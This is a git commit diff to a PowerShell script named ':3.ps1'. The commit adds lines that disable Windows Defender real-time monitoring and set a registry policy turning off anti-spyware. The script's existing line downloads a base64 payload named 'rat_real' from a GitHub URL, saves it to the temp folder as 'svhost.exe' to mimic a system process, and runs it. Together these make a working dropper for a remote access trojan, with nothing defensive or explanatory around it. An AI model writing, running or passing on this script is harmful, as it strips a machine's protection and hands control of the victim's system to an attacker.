e0e7c0a799facf2f140ead589992884c157f8a99
leetcodeuser123 <kingzers9851@gmail.com>
2024-07-15 09:40:45 -0700

    Update :3.ps1

--- :3.ps1
+++ :3.ps1
@@ -1,1 +1,3 @@
+Set-MpPreference -DisableRealtimeMonitoring $true
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
 $exePath = "$env:TEMP\svhost.exe"; [System.IO.File]::WriteAllBytes($exePath, [System.Convert]::FromBase64String((irm "https://github.com/leetcodeuser123/temp/raw/main/rat_real"))); & $exePath
